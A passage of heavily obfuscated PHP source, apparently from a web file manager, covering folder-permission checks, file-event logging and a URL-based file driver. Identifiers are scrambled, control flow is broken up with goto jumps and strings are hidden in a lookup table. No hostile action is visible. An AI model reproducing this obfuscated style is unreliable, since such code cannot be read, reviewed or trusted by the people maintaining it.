} } goto BÂÏÂ‰âˆ; eÆ·¹ÒÅ†±: $DĞŸºÆÔ– = Model($Ağ¼†İÑŞ¢[1110])->parentLevelArray($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[455]]); $DĞŸºÆÔ– = array_merge(array($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[366]]), array_reverse($DĞŸºÆÔ–)); $C‡Ä¥ŠÆ¥ä = $Ağ¼†İÑŞ¢[2229]; goto bçºÇéÎØ; bçºÇéÎØ: $Aá—©Ê¹‘´ = array($Ağ¼†İÑŞ¢[380] => array($Ağ¼†İÑŞ¢[381], $DĞŸºÆÔ–)); $e©ë¾ŠÊ› = $this->field($C‡Ä¥ŠÆ¥ä)->where($Aá—©Ê¹‘´)->select(); $e©ë¾ŠÊ› = array_to_keyvalue_group($e©ë¾ŠÊ›, $Ağ¼†İÑŞ¢[366]); goto Dğ¦É·›Ê±; BÂÏÂ‰âˆ: if (count($BªáÜ¦š¥Š) == 0) { $BªáÜ¦š¥Š = $this->authFolderOwnerGroup($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[452]]); } $BªáÜ¦š¥Š = array_unique($BªáÜ¦š¥Š); if (AuthModel::authCheckRoot($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[373]][$Ağ¼†İÑŞ¢[374]])) { $BªáÜ¦š¥Š[] = USER_ID; } goto Cƒ™–ó½•‰; AÑŞÊÑßÚì: } private function authFolderOwnerGroup($D¹ÆÈ¿ç÷ç) { $EÈ¸âÓ›¨Ô =& $_SERVER[Äº¡•ô™Ÿ]; $dÓ‹¨Å¤¸ = Model($EÈ¸âÓ›¨Ô[2153])->where(array($EÈ¸âÓ›¨Ô[2079] => $D¹ÆÈ¿ç÷ç))->select(); $F…ùëšÙº = array(); if (!$dÓ‹¨Å¤¸) { return $F…ùëšÙº; } foreach ($dÓ‹¨Å¤¸ as $DÀ¾ñã­Ğ®) { $Fæ£ÚÄÜ = $this->authInfo($DÀ¾ñã­Ğ®); if (AuthModel::authCheckRoot($Fæ£ÚÄÜ[$EÈ¸âÓ›¨Ô[373]])) { $F…ùëšÙº[] = $DÀ¾ñã­Ğ®[$EÈ¸âÓ›¨Ô[1416]]; } } return $F…ùëšÙº; } private function authFolderOwnerUser($a…ÆñŠÕô) { $d‡£¥ÌĞ =& $_SERVER[Äº¡•ô™Ÿ]; $d³§Ô·šïò = array(); $Bì‰ªÏ­èØ = !1; foreach ($a…ÆñŠÕô as $bŠ×éƒî) { $Aøå‚‚…Ä• = $this->authInfo($bŠ×éƒî); if ($bŠ×éƒî[$d‡£¥ÌĞ[452]] == $d‡£¥ÌĞ[464]) { $Bì‰ªÏ­èØ = !0; } if ($bŠ×éƒî[$d‡£¥ÌĞ[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Aøå‚‚…Ä•[$d‡£¥ÌĞ[373]])) { $d³§Ô·šïò[] = $bŠ×éƒî[$d‡£¥ÌĞ[452]]; } } } return array($d‡£¥ÌĞ[531] => $d³§Ô·šïò, $d‡£¥ÌĞ[2238] => $Bì‰ªÏ­èØ); } public function authMake($dö»Ù·‹Ïù) { goto eš¡…œç¿; fÌå„š—è: $d‹Ç—ƒí£§ = $dš”„ëêğí ? $béºêõĞë : ($f¸ŒÍè¨ ? $fŠ‹µœóØ : $fÜÏ£¤Í§Õ); $Cñò‘ä¹ = array($CÈåİ®–š[2235] => intval($E¤’Óëíå), $CÈåİ®–š[2236] => $d‹Ç—ƒí£§); return $Cñò‘ä¹; goto FŒˆ²Íá¿ğ; eš¡…œç¿: $CÈåİ®–š =& $_SERVER[Äº¡•ô™Ÿ]; if (!$dö»Ù·‹Ïù) { return array($CÈåİ®–š[374] => 0, $CÈåİ®–š[414] => !1); } $c¦Ë¹§È‡° = Session::get($CÈåİ®–š[2191]); goto Báìõì„…; aë¬÷Ò»·ø: $A®•¡£ïŸ¸ = 0; foreach ($dö»Ù·‹Ïù as $A‰è³¥ƒòä) { $d‹Ç—ƒí£§ = $this->authInfo($A‰è³¥ƒòä); $E’”‰Ë‰â = $A‰è³¥ƒòä[$CÈåİ®–š[452]]; $bÊÑìéí½ = intval($d‹Ç—ƒí£§[$CÈåİ®–š[373]]); if ($A‰è³¥ƒòä[$CÈåİ®–š[368]] == SourceModel::TYPE_USER && $E’”‰Ë‰â == USER_ID) { $dš”„ëêğí = !0; $béºêõĞë = $d‹Ç—ƒí£§; $dÓçÑ¶—öì = $bÊÑìéí½; } else { if ($A‰è³¥ƒòä[$CÈåİ®–š[368]] == SourceModel::TYPE_GROUP && in_array($E’”‰Ë‰â, $E¬´â«ïÒÊ)) { $f¸ŒÍè¨ = !0; if ($bÊÑìéí½ >= $EÓªêöÀá») { $EÓªêöÀá» = $bÊÑìéí½; $fŠ‹µœóØ = $d‹Ç—ƒí£§; } } else { if ($E’”‰Ë‰â == $CÈåİ®–š[464]) { $A®•¡£ïŸ¸ = !0; $fÜÏ£¤Í§Õ = $d‹Ç—ƒí£§; $bø«Éß•Ë = $bÊÑìéí½; } } } } $E¤’Óëíå = $dš”„ëêğí ? $dÓçÑ¶—öì : ($f¸ŒÍè¨ ? $EÓªêöÀá» : $bø«Éß•Ë); goto fÌå„š—è; Báìõì„…: $E¬´â«ïÒÊ = array_to_keyvalue($c¦Ë¹§È‡°, $CÈåİ®–š[33], $CÈåİ®–š[2079]); $dÓçÑ¶—öì = 0; $EÓªêöÀá» = 0; goto C‰âÇŠÂ†Á; aÂƒÈ‚Å¹: $fÜÏ£¤Í§Õ = 0; $dš”„ëêğí = 0; $f¸ŒÍè¨ = 0; goto aë¬÷Ò»·ø; C‰âÇŠÂ†Á: $bø«Éß•Ë = 0; $béºêõĞë = 0; $fŠ‹µœóØ = 0; goto aÂƒÈ‚Å¹; FŒˆ²Íá¿ğ: } public function authTargetInfoMake($eËÛÜêÃÜ¤) { goto DÇÙ¡ÆóÄ¬; Dë·š¹¨Æ: return array($aÖÍÜíƒË[2240] => $f î×œÌÅè, $aÖÍÜíƒË[2241] => $C•İ»¶); goto Cêì²µàª; DÇÙ¡ÆóÄ¬: $aÖÍÜíƒË =& $_SERVER[Äº¡•ô™Ÿ]; $f î×œÌÅè = array(); $C•İ»¶ = array(); goto A¥ÙÒË»òó; A¥ÙÒË»òó: foreach ($eËÛÜêÃÜ¤ as $eõ–ÈÚ½¯®) { if ($eõ–ÈÚ½¯®[$aÖÍÜíƒË[368]] == SourceModel::TYPE_USER) { $f î×œÌÅè[] = intval($eõ–ÈÚ½¯®[$aÖÍÜíƒË[452]]); } else { if ($eõ–ÈÚ½¯®[$aÖÍÜíƒË[368]] == SourceModel::TYPE_GROUP) { $C•İ»¶[] = intval($eõ–ÈÚ½¯®[$aÖÍÜíƒË[452]]); } } } if ($f î×œÌÅè) { $f î×œÌÅè = Model($aÖÍÜíƒË[470])->userListInfo($f î×œÌÅè); } if ($C•İ»¶) { $C‹ƒïğ´½Å = array($aÖÍÜíƒË[2151] => array($aÖÍÜíƒË[381], $C•İ»¶)); $C•İ»¶ = Model($aÖÍÜíƒË[454])->field($aÖÍÜíƒË[2164])->where($C‹ƒïğ´½Å)->select(); $C•İ»¶ = array_to_keyvalue($C•İ»¶, $aÖÍÜíƒË[2079]); } goto Dë·š¹¨Æ; Cêì²µàª: } private function authInfo($Bò²ØÕ) { $Aˆ“šîÃ ² =& $_SERVER[Äº¡•ô™Ÿ]; if ($Bò²ØÕ[$Aˆ“šîÃ ²[2207]]) { $aƒ±Æ¯Ìé– = Model($Aˆ“šîÃ ²[2226])->listData($Bò²ØÕ[$Aˆ“šîÃ ²[2207]]); if (!$aƒ±Æ¯Ìé–) { return !1; $a Â¦±×¥ƒ = Model($Aˆ“šîÃ ²[2226])->listData(); $c“Ó¤Ä‘È« = array_filter_by_field($a Â¦±×¥ƒ, $Aˆ“šîÃ ²[373], $Aˆ“šîÃ ²[464]); return $c“Ó¤Ä‘È«; } $dØá°È±ç‹ = array_field_key($aƒ±Æ¯Ìé–, array($Aˆ“šîÃ ²[364], $Aˆ“šîÃ ²[28], $Aˆ“šîÃ ²[373], $Aˆ“šîÃ ²[2097], $Aˆ“šîÃ ²[2100])); $dØá°È±ç‹[$Aˆ“šîÃ ²[2242]] = $Bò²ØÕ; return $dØá°È±ç‹; } else { return array($Aˆ“šîÃ ²[382] => 0, $Aˆ“šîÃ ²[2085] => $Bò²ØÕ[$Aˆ“šîÃ ²[2208]], $Aˆ“šîÃ ²[383] => $Aˆ“šîÃ ²[33], $Aˆ“šîÃ ²[2097] => $Aˆ“šîÃ ²[2243]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\x65\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\x54\x69\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\165\156\x63\164\151\157\x6e"), array("\x64\145\x73\143", '', "\151\156\x73\x65\x72\x74\54\x75\x70\144\141\164\145\x2c\x73\x65\x6c\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($AââÈÀ„¸İ, $BÚ‡³Ü¦ª, $BÂô ¾É½º = '') { goto bˆÉéÅ¤¥¼; bç†ØÈñ‚¯: $dŠŒ ”ŸÏÆ = array($aÖªîöÍ§Ñ[380] => $AââÈÀ„¸İ, $aÖªîöÍ§Ñ[2244] => $c¯«ïˆ½Ğ[$aÖªîöÍ§Ñ[457]], $aÖªîöÍ§Ñ[2245] => $c¯«ïˆ½Ğ[$aÖªîöÍ§Ñ[28]], $aÖªîöÍ§Ñ[462] => $c¯«ïˆ½Ğ[$aÖªîöÍ§Ñ[462]], $aÖªîöÍ§Ñ[1407] => USER_ID, $aÖªîöÍ§Ñ[385] => $BÚ‡³Ü¦ª, $aÖªîöÍ§Ñ[1409] => $BÂô ¾É½º); $this->addSystemLog($BÚ‡³Ü¦ª, $dŠŒ ”ŸÏÆ); return $this->add($dŠŒ ”ŸÏÆ); goto BÕÇ­ĞÑ•; bˆÉéÅ¤¥¼: $aÖªîöÍ§Ñ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->eventSave) { return; } $c¯«ïˆ½Ğ = Model($aÖªîöÍ§Ñ[1110])->sourceInfo($AââÈÀ„¸İ); goto bÙ¦É›Ğ“; bÙ¦É›Ğ“: if (!$c¯«ïˆ½Ğ) { return !1; } if ($this->isCacheEvent($c¯«ïˆ½Ğ, $BÚ‡³Ü¦ª)) { return; } if ($BÂô ¾É½º && is_string($BÂô ¾É½º)) { $BÂô ¾É½º = array($aÖªîöÍ§Ñ[2109] => $BÂô ¾É½º); } goto bç†ØÈñ‚¯; BÕÇ­ĞÑ•: } private function addSystemLog($b²ÌŠö¨·ğ, $Bº¥èËŒ·œ) { $AÇ¶Ê‚ˆÜ =& $_SERVER[Äº¡•ô™Ÿ]; if ($b²ÌŠö¨·ğ == $AÇ¶Ê‚ˆÜ[2246]) { $b²ÌŠö¨·ğ = $Bº¥èËŒ·œ[$AÇ¶Ê‚ˆÜ[401]][$AÇ¶Ê‚ˆÜ[2247]]; } else { if (in_array($b²ÌŠö¨·ğ, array($AÇ¶Ê‚ˆÜ[2056], $AÇ¶Ê‚ˆÜ[2248]))) { $b²ÌŠö¨·ğ = $Bº¥èËŒ·œ[$AÇ¶Ê‚ˆÜ[401]][$AÇ¶Ê‚ˆÜ[695]]; } } $eŠ¤ƒÔà½Á = array_merge($Bº¥èËŒ·œ, array($AÇ¶Ê‚ˆÜ[2249] => $Bº¥èËŒ·œ[$AÇ¶Ê‚ˆÜ[366]], $AÇ¶Ê‚ˆÜ[2250] => $Bº¥èËŒ·œ[$AÇ¶Ê‚ˆÜ[2250]])); Model($AÇ¶Ê‚ˆÜ[2020])->addLog($AÇ¶Ê‚ˆÜ[2251] . $b²ÌŠö¨·ğ, $eŠ¤ƒÔà½Á); } private function isCacheEvent($Fšñš°„ÅÓ, $b—òßƒÅ¬˜) { if ($Fšñš°„ÅÓ[$_SERVER[Äº¡•ô™Ÿ][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($d¯òøÈÕ„Ğ, $C ÁºÈÍ†) { $dŞùåĞå =& $_SERVER[Äº¡•ô™Ÿ]; $BŒÇ‰‚‘Ï = Model($dŞùåĞå[1110])->sourceInfo($d¯òøÈÕ„Ğ); $CçŞñ½ÕÀ¯ = array($dŞùåĞå[2247] => $C ÁºÈÍ†, $dŞùåĞå[28] => $BŒÇ‰‚‘Ï[$dŞùåĞå[28]]); return $this->addEvent($d¯òøÈÕ„Ğ, $dŞùåĞå[2246], $CçŞñ½ÕÀ¯); } public function eventFileEdit($D¥ÕÃ¶æØ¦) { $fæ¨£ØˆÙ =& $_SERVER[Äº¡•ô™Ÿ]; $dè˜•……‘Ë = array($fæ¨£ØˆÙ[2252] => $_SERVER[$fæ¨£ØˆÙ[2253]], $fæ¨£ØˆÙ[1726] => strtolower(ACTION)); return $this->addEvent($D¥ÕÃ¶æØ¦, $fæ¨£ØˆÙ[2047], $dè˜•……‘Ë); } public function eventRecycle($Eİ°……Ü¯¥, $b¤èÖÈÂ«Œ) { return $this->addEvent($Eİ°……Ü¯¥, $_SERVER[Äº¡•ô™Ÿ][2248], $b¤èÖÈÂ«Œ); } public function eventRemove($Fêã´‹†«İ) { $c³Ù¶ˆÆÈâ =& $_SERVER[Äº¡•ô™Ÿ]; $BÆ²Í¥ƒ = Model($c³Ù¶ˆÆÈâ[1110])->sourceInfo($Fêã´‹†«İ); $CÔìó…ÆöÓ = $BÆ²Í¥ƒ[$c³Ù¶ˆÆÈâ[28]]; return $this->addEvent($BÆ²Í¥ƒ[$c³Ù¶ˆÆÈâ[457]], $c³Ù¶ˆÆÈâ[2046], $CÔìó…ÆöÓ); } public function eventShare($D¯êä²”±, $BÛìçËï­) { return $this->addEvent($D¯êä²”±, $_SERVER[Äº¡•ô™Ÿ][2056], $BÛìçËï­); } public function eventMove($cèéİ—Ö¦, $bªç‡‰Û„, $FÖÔÛØ›‹) { goto DÕ ë¡‘‡¥; AîÉî¼Îáê: $this->addEvent($bªç‡‰Û„, $eêÌÒñ’¦ä[2258], $aÔ¿”‚ì§¶); goto f¶Î»¯ºŠ¢; fÆ÷˜—‘Ã: $this->addEvent($cèéİ—Ö¦, $eêÌÒñ’¦ä[488], $aÔ¿”‚ì§¶); $DÔÖ¹¦‡™ = $DŒ÷Ş â‘Â->sourceInfo($cèéİ—Ö¦); $aÔ¿”‚ì§¶ = array($eêÌÒñ’¦ä[366] => $DÔÖ¹¦‡™[$eêÌÒñ’¦ä[366]], $eêÌÒñ’¦ä[28] => $DÔÖ¹¦‡™[$eêÌÒñ’¦ä[28]]); goto AîÉî¼Îáê; DÕ ë¡‘‡¥: $eêÌÒñ’¦ä =& $_SERVER[Äº¡•ô™Ÿ]; $DŒ÷Ş â‘Â = Model($eêÌÒñ’¦ä[1110]); $DÔÖ¹¦‡™ = $DŒ÷Ş â‘Â->sourceInfo($cèéİ—Ö¦); goto FÙ¨ìçÁí·; FÙ¨ìçÁí·: $D™ƒïËÛÛ = $DŒ÷Ş â‘Â->sourceInfo($bªç‡‰Û„); $A¤î‹Ùø‘ = $DŒ÷Ş â‘Â->sourceInfo($FÖÔÛØ›‹); $aÔ¿”‚ì§¶ = array($eêÌÒñ’¦ä[1006] => $bªç‡‰Û„, $eêÌÒñ’¦ä[2254] => $D™ƒïËÛÛ[$eêÌÒñ’¦ä[28]], $eêÌÒñ’¦ä[2255] => $D™ƒïËÛÛ[$eêÌÒñ’¦ä[462]], $eêÌÒñ’¦ä[1007] => $FÖÔÛØ›‹, $eêÌÒñ’¦ä[2256] => $A¤î‹Ùø‘[$eêÌÒñ’¦ä[28]], $eêÌÒñ’¦ä[2257] => $A¤î‹Ùø‘[$eêÌÒñ’¦ä[462]]); goto fÆ÷˜—‘Ã; f¶Î»¯ºŠ¢: } public function eventCopy($c‚ˆ ¢˜Ìµ) { $this->eventCreate($c‚ˆ ¢˜Ìµ, $_SERVER[Äº¡•ô™Ÿ][486]); } public function eventRename($B¨È‡ìùŸš, $BêÉÑÛÊ‰, $C˜¿¼½ƒƒ») { $Fò™¦¥í =& $_SERVER[Äº¡•ô™Ÿ]; $bø¯Íœˆïö = array($Fò™¦¥í[1006] => $BêÉÑÛÊ‰, $Fò™¦¥í[1007] => $C˜¿¼½ƒƒ»); return $this->addEvent($B¨È‡ìùŸš, $Fò™¦¥í[1122], $bø¯Íœˆïö); } public function eventAddComment($bÅğš ‘ï½, $B š©ƒ•) { return $this->addEvent($bÅğš ‘ï½, $_SERVER[Äº¡•ô™Ÿ][2259], $B š©ƒ•); } public function eventAddDesc($eÃí‹îÉïÛ, $eÏÄŒá¬ªè) { return $this->addEvent($eÃí‹îÉïÛ, $_SERVER[Äº¡•ô™Ÿ][2260], $eÏÄŒá¬ªè); } public function listBySource($BÚ¢çÑòÆ) { goto DõòŞ‘¨î; fáƒëÍ‡Ñ½: $Cˆ±¼ç“ = $this->eventListParse($Cˆ±¼ç“, $BÚ¢çÑòÆ); show_json($Cˆ±¼ç“); goto a‚ÔñÏÈóˆ; aœÙŸøÒ: if ($FÇ²ğÒÇÜœ[$AÎšï¤ñ·‹[367]] == $AÎšï¤ñ·‹[83]) { $b¬Á†½æ›ã = Model($AÎšï¤ñ·‹[1110])->listSearchChildren($BÚ¢çÑòÆ, 20000); $b¬Á†½æ›ã[] = $BÚ¢çÑòÆ . $AÎšï¤ñ·‹[358]; $e¡ÛÄÏ÷åæ = array($AÎšï¤ñ·‹[366] => array($AÎšï¤ñ·‹[7], $b¬Á†½æ›ã)); } $Cˆ±¼ç“ = $this->where($e¡ÛÄÏ÷åæ)->order($AÎšï¤ñ·‹[2261])->selectPage(); if ($Cˆ±¼ç“[$AÎšï¤ñ·‹[348]][$AÎšï¤ñ·‹[349]] == 0) { $Cˆ±¼ç“[$AÎšï¤ñ·‹[348]][$AÎšï¤ñ·‹[349]] = 1; $Cˆ±¼ç“[$AÎšï¤ñ·‹[351]] = array(array($AÎšï¤ñ·‹[380] => $BÚ¢çÑòÆ, $AÎšï¤ñ·‹[2244] => $FÇ²ğÒÇÜœ[$AÎšï¤ñ·‹[457]], $AÎšï¤ñ·‹[1407] => $FÇ²ğÒÇÜœ[$AÎšï¤ñ·‹[375]], $AÎšï¤ñ·‹[385] => $AÎšï¤ñ·‹[2262], $AÎšï¤ñ·‹[386] => $FÇ²ğÒÇÜœ[$AÎšï¤ñ·‹[184]], $AÎšï¤ñ·‹[1409] => $AÎšï¤ñ·‹[33])); } goto fáƒëÍ‡Ñ½; DõòŞ‘¨î: $AÎšï¤ñ·‹ =& $_SERVER[Äº¡•ô™Ÿ]; $FÇ²ğÒÇÜœ = Model($AÎšï¤ñ·‹[1110])->sourceInfo($BÚ¢çÑòÆ); $e¡ÛÄÏ÷åæ = array($AÎšï¤ñ·‹[380] => $BÚ¢çÑòÆ); goto aœÙŸøÒ; a‚ÔñÏÈóˆ: } private function eventListParse($D¦ä±ĞõÎÚ, $AÁòŠàÙ¿¨) { goto fÈöˆ‚›”å; dÑ•ÛöŞ“Õ: return $D¦ä±ĞõÎÚ; goto fôô‚„ĞäÕ; bñâ¿®ó: $e”ìÑÖö½› = array_unique($e”ìÑÖö½›); $A±°¤‹•¿Æ = array_unique(array_to_keyvalue($cÅ±ù¤–¨ø, $dÏ´É¦ ‹[33], $dÏ´É¦ ‹[1416])); $DàèÂ¦ñéé = Model($dÏ´É¦ ‹[473])->userListInfo($A±°¤‹•¿Æ); goto eëùâï½‚”; Bæ©Ù‘³…: $E¾İ÷·ÑÍ³ = array_to_keyvalue($cÅ±ù¤–¨ø, $dÏ´É¦ ‹[33], $dÏ´É¦ ‹[2250]); foreach ($cÅ±ù¤–¨ø as $f ©„Ş‹÷Ï) { $C‹÷¬ÚµÓ = $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]]; if ($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[29]] == $dÏ´É¦ ‹[488] && isset($C‹÷¬ÚµÓ[$dÏ´É¦ ‹[1006]])) { $e”ìÑÖö½›[] = $C‹÷¬ÚµÓ[$dÏ´É¦ ‹[1006]] . $dÏ´É¦ ‹[33]; $e”ìÑÖö½›[] = $C‹÷¬ÚµÓ[$dÏ´É¦ ‹[1007]] . $dÏ´É¦ ‹[33]; } if ($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[29]] == $dÏ´É¦ ‹[2258] && isset($C‹÷¬ÚµÓ[$dÏ´É¦ ‹[366]])) { $e”ìÑÖö½›[] = $C‹÷¬ÚµÓ[$dÏ´É¦ ‹[366]] . $dÏ´É¦ ‹[33]; } } $e”ìÑÖö½› = array_merge($e”ìÑÖö½›, $E¾İ÷·ÑÍ³, array($AÁòŠàÙ¿¨ . $dÏ´É¦ ‹[33])); goto bñâ¿®ó; eëùâï½‚”: $bÅâóğ’Œ = Model($dÏ´É¦ ‹[755])->sourceListInfo($e”ìÑÖö½›, !0); foreach ($cÅ±ù¤–¨ø as &$f ©„Ş‹÷Ï) { if ($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[29]] == $dÏ´É¦ ‹[488] && isset($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[1006]])) { $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[1006]] = $bÅâóğ’Œ[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[1006]]]; $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[1007]] = $bÅâóğ’Œ[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[1007]]]; } if ($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[29]] == $dÏ´É¦ ‹[2258] && isset($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[366]])) { $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[366]] = $bÅâóğ’Œ[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[401]][$dÏ´É¦ ‹[366]]]; } $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[388]] = $bÅâóğ’Œ[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[366]]]; $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2263]] = $bÅâóğ’Œ[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2250]]]; if ($f ©„Ş‹÷Ï[$dÏ´É¦ ‹[29]] == $dÏ´É¦ ‹[2046]) { $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2263]] = $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[388]]; $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2250]] = $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2263]][$dÏ´É¦ ‹[366]]; $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[388]] = !1; $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[366]] = $dÏ´É¦ ‹[33]; } $f ©„Ş‹÷Ï[$dÏ´É¦ ‹[2216]] = $DàèÂ¦ñéé[$f ©„Ş‹÷Ï[$dÏ´É¦ ‹[1416]]]; } $D¦ä±ĞõÎÚ[$dÏ´É¦ ‹[351]] = $cÅ±ù¤–¨ø; goto dÑ•ÛöŞ“Õ; fÈöˆ‚›”å: $dÏ´É¦ ‹ =& $_SERVER[Äº¡•ô™Ÿ]; $cÅ±ù¤–¨ø = $D¦ä±ĞõÎÚ[$dÏ´É¦ ‹[351]]; $e”ìÑÖö½› = array_to_keyvalue($cÅ±ù¤–¨ø, $dÏ´É¦ ‹[33], $dÏ´É¦ ‹[366]); goto Bæ©Ù‘³…; fôô‚„ĞäÕ: } public function removeBySource($EíÃ¾¶Ã¬Ø) { $aä—ô‚ŞÄÜ = array($_SERVER[Äº¡•ô™Ÿ][380] => $EíÃ¾¶Ã¬Ø); $this->where($aä—ô‚ŞÄÜ)->remove(); } } goto f“¥êÓÊø; a¦ªŞéëóå: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($C¬”ÇŸ‚œ = false) { } public function exist($DÜ—³÷ä…Õ) { $b‘ó·©‡ŠÕ = $this->info($DÜ—³÷ä…Õ); return $b‘ó·©‡ŠÕ[$_SERVER[Äº¡•ô™Ÿ][185]]; } public function isFile($aªÜºíªÅ¦) { $FÔÙÍĞ‘’ = $this->info($aªÜºíªÅ¦); return $FÔÙÍĞ‘’[$_SERVER[Äº¡•ô™Ÿ][185]]; } public function isFolder($a‡Àïƒ·Ó†) { return !1; } public function size($Fä‰í ÉÛ£) { $aƒŒ„ô“Ô™ = $this->info($Fä‰í ÉÛ£); return $aƒŒ„ô“Ô™[$_SERVER[Äº¡•ô™Ÿ][77]]; } public function info($CŠ†ŠêæŞ) { return $this->infoParse($CŠ†ŠêæŞ); } public function infoAuth($AĞ¹‡„„ëã) { return $this->infoParse($AĞ¹‡„„ëã); } public function infoWithChildren($Dó¦­èÙÙ­) { return $this->infoParse($Dó¦­èÙÙ­); } public function infoFull($F”å£âïÔ) { return $this->infoParse($F”å£âïÔ); } private function infoParse($cŞœ¹÷Èœ‚) { $f¢Ş±ìŞˆ =& $_SERVER[Äº¡•ô™Ÿ]; $có‰ŸîšŸ = $this->header($cŞœ¹÷Èœ‚); if (!$có‰ŸîšŸ || !$có‰ŸîšŸ[$f¢Ş±ìŞˆ[692]]) { return !1; } $dº—ÅÍåÕ¸ = _get($có‰ŸîšŸ, $f¢Ş±ìŞˆ[322], 0); $E¾¼¶è¡‹­ = array($f¢Ş±ìŞˆ[28] => $có‰ŸîšŸ[$f¢Ş±ìŞˆ[28]], $f¢Ş±ìŞˆ[75] => $cŞœ¹÷Èœ‚, $f¢Ş±ìŞˆ[29] => $f¢Ş±ìŞˆ[164], $f¢Ş±ìŞˆ[77] => intval($dº—ÅÍåÕ¸), $f¢Ş±ìŞˆ[157] => get_path_ext($có‰ŸîšŸ[$f¢Ş±ìŞˆ[28]]), $f¢Ş±ìŞˆ[1154] => $dº—ÅÍåÕ¸ > 0 && $có‰ŸîšŸ[$f¢Ş±ìŞˆ[1283]], $f¢Ş±ìŞˆ[1155] => !1); return $E¾¼¶è¡‹­; } private function header($bªõÑö¿´¨) { if (isset(self::$_cacheHeader[$bªõÑö¿´¨])) { return self::$_cacheHeader[$bªõÑö¿´¨]; } self::$_cacheHeader[$bªõÑö¿´¨] = url_header($bªõÑö¿´¨); return self::$_cacheHeader[$bªõÑö¿´¨]; } public function hashSimple($e‰àĞ¦ÈÆ, $B¶¹ë÷Óøé = false) { goto A­‚”Üµ«‘; CêÄæå“±®: $EŠ®•ÏÑŒÅ = $f…Õ¬¯îÌ[$DŒª…É¹™‘[77]]; $Aİƒİ±‰ = 200; $BÌ®ŠĞ¨‘ = 50; goto c¾Ÿ¼ŞÉŒ“; c¾Ÿ¼ŞÉŒ“: if ($EŠ®•ÏÑŒÅ <= $Aİƒİ±‰ * $BÌ®ŠĞ¨‘) { return md5($this->fileSubstr($e‰àĞ¦ÈÆ, 0, $EŠ®•ÏÑŒÅ)) . $EŠ®•ÏÑŒÅ; } $fêùº”º = intval($EŠ®•ÏÑŒÅ / $BÌ®ŠĞ¨‘); $Aª»‹§˜«Á = $DŒª…É¹™‘[33]; goto Cõî¾ó„ßÁ; FÜ¤¾†‰§: $Aª»‹§˜«Á .= $this->fileSubstr($e‰àĞ¦ÈÆ, $EŠ®•ÏÑŒÅ - $Aİƒİ±‰, $Aİƒİ±‰); return md5($Aª»‹§˜«Á) . $EŠ®•ÏÑŒÅ; goto c¢ÌÅåº—á; A­‚”Üµ«‘: $DŒª…É¹™‘ =& $_SERVER[Äº¡•ô™Ÿ]; $f…Õ¬¯îÌ = $this->info($e‰àĞ¦ÈÆ); if (!$f…Õ¬¯îÌ || !$f…Õ¬¯îÌ[$DŒª…É¹™‘[185]]) { return !1; } goto CêÄæå“±®; Cõî¾ó„ßÁ: $cÓØ°»¥Á = timeFloat(); $dµŠ‘ÅÌ¹ = 15; for ($fÚ·ƒœ´š” = 0; $fÚ·ƒœ´š” < $BÌ®ŠĞ¨‘; $fÚ·ƒœ´š”++) { if (timeFloat() - $cÓØ°»¥Á > $dµŠ‘ÅÌ¹) { return !1; } $AÌÛœéÂ°© = $this->fileSubstr($e‰àĞ¦ÈÆ, $fêùº”º * $fÚ·ƒœ´š”, $Aİƒİ±‰); if (!$AÌÛœéÂ°©) { return !1; } $Aª»‹§˜«Á .= $AÌÛœéÂ°©; } goto FÜ¤¾†‰§; c¢ÌÅåº—á: } public function getContent($aß˜«¦‰İ) { return $this->fileSubstr($aß˜«¦‰İ); } public function fileSubstr($E§¨÷º¡ğ, $d¤ÌŸİ„Ì´ = 0, $FÙª“¶‰Æò = -1) { goto fîÜ‡²ŞÅ; a˜„Ğç¤‚…: if ($FÙª“¶‰Æò === -1) { $FÙª“¶‰Æò = $Dƒ„É¾âè[$eôÏñÜ±ò[77]]; } if ($FÙª“¶‰Æò == 0) { return $eôÏñÜ±ò[33]; } $e‘÷†«•“ = array($eôÏñÜ±ò[1284] . $d¤ÌŸİ„Ì´ . $eôÏñÜ±ò[717] . ($d¤ÌŸİ„Ì´ + $FÙª“¶‰Æò - 1)); goto a´Ó†„Å; fîÜ‡²ŞÅ: $eôÏñÜ±ò =& $_SERVER[Äº¡•ô™Ÿ]; $Dƒ„É¾âè = $this->info($E§¨÷º¡ğ); if (!$Dƒ„É¾âè || 